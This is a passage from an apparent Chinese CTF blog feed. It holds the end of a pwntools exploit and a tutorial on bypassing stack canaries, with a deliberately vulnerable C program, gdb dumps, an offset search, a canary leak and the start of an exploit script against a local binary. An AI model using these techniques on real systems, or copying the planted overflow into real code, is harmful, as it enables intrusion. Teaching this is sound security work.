sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#sh.sendline("/bin/sh\x00")</span>        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat sms.py\x00'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#这里我直接cat 本地文件了，也可以用/bin/sh，我跟倾向于cat 文件 比较明了。</span>        sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true">#print sh.recv() 这个操作可以多学习</span>        <span class="token comment" spellcheck="true">#sh.interactive()</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span></code></pre><p><img src="https://s1.ax1x.com/2020/07/15/Ua6WCQ.png" alt=""><br>成功！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-canary绕过</title>
      <link href="/2020/07/12/wiki-canary-rao-guo/"/>
      <url>/2020/07/12/wiki-canary-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="1：介绍"><a href="#1：介绍" class="headerlink" title="1：介绍"></a>1：介绍</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。<br>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。<br>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p><h2 id="2：Canary-原理"><a href="#2：Canary-原理" class="headerlink" title="2：Canary 原理"></a>2：Canary 原理</h2><p>在 GCC 中使用 Canary<br>可以在 GCC 中使用以下参数设置 Canary:</p><pre class=" language-bash"><code class="language-bash">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护-fno-stack-protector 禁用保护</code></pre><p>开启 Canary 保护的 stack 结构大概如下：</p><pre><code>        High        Address |                 |                +-----------------+                | args            |                +-----------------+                | return address  |                +-----------------+        rbp =&gt;  | old ebp         |                +-----------------+      rbp-8 =&gt;  | canary value    |                +-----------------+                | local variables |        Low     |                 |        Address</code></pre><p>汇编指令一般如下：</p><pre class=" language-bash"><code class="language-bash">mov     eax, large gs:14h   <span class="token comment" spellcheck="true">#将一个cookie放在eax</span>mov     <span class="token punctuation">[</span>ebp+var_C<span class="token punctuation">]</span>, eax    <span class="token comment" spellcheck="true">#再由eax放入[ebp+var_C]（栈中靠后的位置）</span>··········mov     eax, <span class="token punctuation">[</span>ebp+var_C<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#将其赋值到eax</span>xor     eax, large gs:14h  <span class="token comment" spellcheck="true">#将其与原cookie比较            #影响zf标志寄存器</span>jz      short loc_8048692  <span class="token comment" spellcheck="true">#如果计算结果不为0就跳转（上面的异或操作）</span></code></pre><p>如果栈中的cookie被更改了就会jz跳到call  __stack_chk_fail_local。其也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下：</p><pre class=" language-c"><code class="language-c">eglibc<span class="token number">-2.19</span><span class="token operator">/</span>debug<span class="token operator">/</span>stack_chk_fail<span class="token punctuation">.</span>c<span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>希望我以后能懂这个定义（doge）</code></pre><p>对于 Linux 来说，gs 寄存器实际指向的是当前栈的 TLS 结构，gs:14h 指向的正是 <strong>stack_guard</strong>。 </p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the TCB.  Not necessarily the                       thread descriptor used by libpthread.  */</span>  dtv_t <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  uintptr_t sysinfo<span class="token punctuation">;</span>  uintptr_t stack_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> tcbhead_t<span class="token punctuation">;</span></code></pre><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 <strong>security_init</strong> 进行初始化。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span>  <span class="token comment" spellcheck="true">// glibc直接使用了_dl_random的值并没有给赋值</span>  <span class="token comment" spellcheck="true">// 如果不采用这种模式, glibc也可以自己产生随机数</span>  <span class="token comment" spellcheck="true">//将_dl_random的最后一个字节设置为0x0</span>  uintptr_t stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 设置Canary的值到TLS中</span>  <span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>  _dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><span class="token macro property">#<span class="token directive keyword">define</span> THREAD_SET_STACK_GUARD(value) \  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></code></pre><p><strong>抓重点：每次开启程序cookie的值随机的</strong></p><h2 id="3：Canary-绕过技术"><a href="#3：Canary-绕过技术" class="headerlink" title="3：Canary 绕过技术"></a>3：Canary 绕过技术</h2><p>注意：Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，<strong>在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求</strong>。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p><strong>Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串（因为它会贴着buf）。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节(\x00,然后就不会被截断)，来打印出剩余的 Canary 部分（前提是得有打印函数）。 这种利用方式需要存在合适的输出函数，并且可能需要第一次溢出泄露 Canary，之后再次溢出控制执行流程。</strong></p><p>例子：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><pre class=" language-bash"><code class="language-bash">$ gcc -m32 -no-pie test.c -o <span class="token function">test</span></code></pre><p>先读程序：输出Hello Hacker!后进入vuln函数，其buf大小为100而可以读入0x200个字符显然存在溢出，还有格式化字符串漏洞。后门getshell。<br>因为插入了cookie，所以我们要想办法得到cookie，找到它在栈中的正确位置构造payload绕过canary</p><h3 id="寻找cookie"><a href="#寻找cookie" class="headerlink" title="寻找cookie"></a>寻找cookie</h3><p>因为cookie插入时汇编代码特征明显，我们多留意其汇编相关的寄存器值即可<br>因为程序默认开启-fstack-protector保护，所以只为局部变量中含有数组的函数插入保护，那我们直接进入vuln函数：</p><pre class=" language-bash"><code class="language-bash">Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> vuln:<span class="token operator">=</span><span class="token operator">></span> 0x0804862b <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp   0x0804862c <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp   0x0804862e <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    push   ebx   0x0804862f <span class="token operator">&lt;</span>+4<span class="token operator">></span>:    sub    esp,0x74   0x08048632 <span class="token operator">&lt;</span>+7<span class="token operator">></span>:    call   0x80484e0 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>   0x08048637 <span class="token operator">&lt;</span>+12<span class="token operator">></span>:    add    ebx,0x19c9   0x0804863d <span class="token operator">&lt;</span>+18<span class="token operator">></span>:    mov    eax,gs:0x14     <span class="token comment" spellcheck="true">#插入cookie</span>   0x08048643 <span class="token operator">&lt;</span>+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax   0x08048646 <span class="token operator">&lt;</span>+27<span class="token operator">></span>:    xor    eax,eax   0x08048648 <span class="token operator">&lt;</span>+29<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x0   0x0804864f <span class="token operator">&lt;</span>+36<span class="token operator">></span>:    jmp    0x804867a <span class="token operator">&lt;</span>vuln+79<span class="token operator">></span>   0x08048651 <span class="token operator">&lt;</span>+38<span class="token operator">></span>:    sub    esp,0x4   0x08048654 <span class="token operator">&lt;</span>+41<span class="token operator">></span>:    push   0x200   0x08048659 <span class="token operator">&lt;</span>+46<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x70<span class="token punctuation">]</span>   0x0804865c <span class="token operator">&lt;</span>+49<span class="token operator">></span>:    push   eax   0x0804865d <span class="token operator">&lt;</span>+50<span class="token operator">></span>:    push   0x0   0x0804865f <span class="token operator">&lt;</span>+52<span class="token operator">></span>:    call   0x8048420 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>   0x08048664 <span class="token operator">&lt;</span>+57<span class="token operator">></span>:    add    esp,0x10   0x08048667 <span class="token operator">&lt;</span>+60<span class="token operator">></span>:    sub    esp,0xc   0x0804866a <span class="token operator">&lt;</span>+63<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x70<span class="token punctuation">]</span>   0x0804866d <span class="token operator">&lt;</span>+66<span class="token operator">></span>:    push   eax   0x0804866e <span class="token operator">&lt;</span>+67<span class="token operator">></span>:    call   0x8048430 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>   0x08048673 <span class="token operator">&lt;</span>+72<span class="token operator">></span>:    add    esp,0x10   0x08048676 <span class="token operator">&lt;</span>+75<span class="token operator">></span>:    add    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x1   0x0804867a <span class="token operator">&lt;</span>+79<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x1   0x0804867e <span class="token operator">&lt;</span>+83<span class="token operator">></span>:    jle    0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>   0x08048680 <span class="token operator">&lt;</span>+85<span class="token operator">></span>:    nop   0x08048681 <span class="token operator">&lt;</span>+86<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#校验cookie</span>   0x08048684 <span class="token operator">&lt;</span>+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14   0x0804868b <span class="token operator">&lt;</span>+96<span class="token operator">></span>:    je     0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>   0x0804868d <span class="token operator">&lt;</span>+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x08048692 <span class="token operator">&lt;</span>+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x08048695 <span class="token operator">&lt;</span>+106<span class="token operator">></span>:    leave     0x08048696 <span class="token operator">&lt;</span>+107<span class="token operator">></span>:    ret    End of assembler dump.gdb-peda$ </code></pre><p>我们让程序执行到<strong><em>6：0x08048643 &lt;+24&gt;:    mov    DWORD PTR [ebp-0xc],eax</em></strong>就可以从eax看到cookie的值</p><pre class=" language-bash"><code class="language-bash">EAX: 0x25710300 EBX: 0x804a000 --<span class="token operator">></span> 0x8049f08 --<span class="token operator">></span> 0x1 ECX: 0xf7fb2dc7 --<span class="token operator">></span> 0xfb38900a EDX: 0xf7fb3890 --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd008 --<span class="token operator">></span> 0xffffd018 --<span class="token operator">></span> 0x0 ESP: 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 EIP: 0x8048643 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax<span class="token punctuation">)</span>EFLAGS: 0x216 <span class="token punctuation">(</span>carry PARITY ADJUST zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x8048632 <span class="token operator">&lt;</span>vuln+7<span class="token operator">></span>:    call   0x80484e0 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>   0x8048637 <span class="token operator">&lt;</span>vuln+12<span class="token operator">></span>:    add    ebx,0x19c9   0x804863d <span class="token operator">&lt;</span>vuln+18<span class="token operator">></span>:    mov    eax,gs:0x14<span class="token operator">=</span><span class="token operator">></span> 0x8048643 <span class="token operator">&lt;</span>vuln+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax   0x8048646 <span class="token operator">&lt;</span>vuln+27<span class="token operator">></span>:    xor    eax,eax   0x8048648 <span class="token operator">&lt;</span>vuln+29<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x0   0x804864f <span class="token operator">&lt;</span>vuln+36<span class="token operator">></span>:    jmp    0x804867a <span class="token operator">&lt;</span>vuln+79<span class="token operator">></span>   0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>:    sub    esp,0x4<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 0004<span class="token operator">|</span> 0xffffcf94 --<span class="token operator">></span> 0xf7fb2dc7 --<span class="token operator">></span> 0xfb38900a 0008<span class="token operator">|</span> 0xffffcf98 --<span class="token operator">></span> 0x1 0012<span class="token operator">|</span> 0xffffcf9c --<span class="token operator">></span> 0x1 0016<span class="token operator">|</span> 0xffffcfa0 --<span class="token operator">></span> 0x1 0020<span class="token operator">|</span> 0xffffcfa4 --<span class="token operator">></span> 0x0 0024<span class="token operator">|</span> 0xffffcfa8 --<span class="token operator">></span> 0xf7e4fab9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_IO_file_overflow+9<span class="token operator">></span>:    add    edx,0x162547<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0xf7fb0860 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 3, 0x08048643 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>发现EAX: 0x25710300  cookie，继续到read函数我们使其读入很多字符（200个）让其执行到要进行比较的时候</p><pre class=" language-bash"><code class="language-bash">EAX: 0x41684141 <span class="token punctuation">(</span><span class="token string">'AAhA'</span><span class="token punctuation">)</span>EBX: 0x804a000 --<span class="token operator">></span> 0x8049f08 --<span class="token operator">></span> 0x1 ECX: 0xde EDX: 0xf7fb3890 --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd008 <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>ESP: 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 EIP: 0x8048684 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14<span class="token punctuation">)</span>EFLAGS: 0x202 <span class="token punctuation">(</span>carry parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804867e <span class="token operator">&lt;</span>vuln+83<span class="token operator">></span>:    jle    0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>   0x8048680 <span class="token operator">&lt;</span>vuln+85<span class="token operator">></span>:    nop   0x8048681 <span class="token operator">&lt;</span>vuln+86<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> 0x8048684 <span class="token operator">&lt;</span>vuln+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14   0x804868b <span class="token operator">&lt;</span>vuln+96<span class="token operator">></span>:    je     0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>   0x804868d <span class="token operator">&lt;</span>vuln+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x8048695 <span class="token operator">&lt;</span>vuln+106<span class="token operator">></span>:    leave<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 0004<span class="token operator">|</span> 0xffffcf94 --<span class="token operator">></span> 0x2 0008<span class="token operator">|</span> 0xffffcf98 <span class="token punctuation">(</span><span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffcf9c <span class="token punctuation">(</span><span class="token string">"AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffcfa0 <span class="token punctuation">(</span><span class="token string">"ABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffcfa4 <span class="token punctuation">(</span><span class="token string">"<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfa8 <span class="token punctuation">(</span><span class="token string">"AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfac <span class="token punctuation">(</span><span class="token string">"A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048684 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>[ebp-0xc] == eax ，判断是否等于原cookie：DWORD PTR gs:0x14，我们发现要进行比较时eax的值被覆盖为AAhA，那查一下offset就知道cookie在栈中的位置了</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ pattern offset AAhAAAhA found at offset: 100gdb-peda$ </code></pre><p><strong>100刚好是buf大小。</strong></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>我们把payload设为 ‘A’*100直接发过去看看会发生什么（开启context.log_level)：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test'</span><span class="token keyword">:</span> pid 6732<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xe bytes:    <span class="token string">'Hello Hacker!\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x65 bytes:    <span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6c bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000060  41 41 41 41  0a ca d5 b5  88 87 04 08               │AAAA│····│····│    0000006c   <span class="token comment" spellcheck="true">##注意小端序问题</span></code></pre><p>我们可以看到AAA后面是0a，<strong>注意这是\n的ASCII码值，因为我们按下了空格\n</strong>。但后面跟着ca d5 b5，由上面的位置计算可知这是cookie的值，<strong>因为前面的\x00被\n覆盖所以无法阶段字符串将后面的什么鬼东西都输出来了，包括cookie的残余值。那我们就可以得到cookie了，只要减一个0xa即可。</strong><br>尝试：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token 